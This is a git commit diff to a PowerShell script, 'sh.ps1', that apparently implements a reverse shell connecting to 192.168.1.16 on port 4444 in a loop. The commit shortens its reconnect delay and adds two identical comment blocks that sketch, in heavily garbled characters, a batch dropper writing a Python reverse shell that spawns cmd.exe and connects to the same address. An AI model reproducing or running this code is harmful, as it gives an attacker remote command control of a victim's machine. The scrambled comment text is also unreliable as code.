c9d460037422692f3830c4b0dbc229e7f7f735ae
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-14 03:59:17 +0300

    Update sh.ps1

--- sh.ps1
+++ sh.ps1
@@ -1,3 +1,35 @@
+<#
+start.bat --> in q« ­èêÚ¶)à ([µÛ]£.bat
+yÈh @yÈh off > ([µÛ]£.bat
+yÈh cd %µé©% >> ([µÛ]£.bat
+yÈh :) >> ([µÛ]£.bat
+yÈh yÈh @yÈh off ^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh del vb1.bat^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh :)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ^>^> ¦º5.bat^ >>([µÛ]£.bat
+yÈh yÈh     ^^(^ ^>^> ¦º5.bat^  >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® ²$z^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® os^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® threading^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® ¶)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    {¦ 
+çyËb¢t^~ëtJë¢ as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh        ­ën® ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+#>
 $ip = "192.168.1.16"
 $port = 4444
 
@@ -52,5 +84,37 @@ while ($true) {
     }
 
     
-    Start-Sleep -Seconds 100
+    Start-Sleep -Seconds 40
 }
+<#
+start.bat --> in q« ­èêÚ¶)à ([µÛ]£.bat
+yÈh @yÈh off > ([µÛ]£.bat
+yÈh cd %µé©% >> ([µÛ]£.bat
+yÈh :) >> ([µÛ]£.bat
+yÈh yÈh @yÈh off ^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh del vb1.bat^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh :)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ^>^> ¦º5.bat^ >>([µÛ]£.bat
+yÈh yÈh     ^^(^ ^>^> ¦º5.bat^  >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® ²$z^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® os^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® threading^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh jh® ¶)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    {¦ 
+çyËb¢t^~ëtJë¢ as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh        ­ën® ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+#>
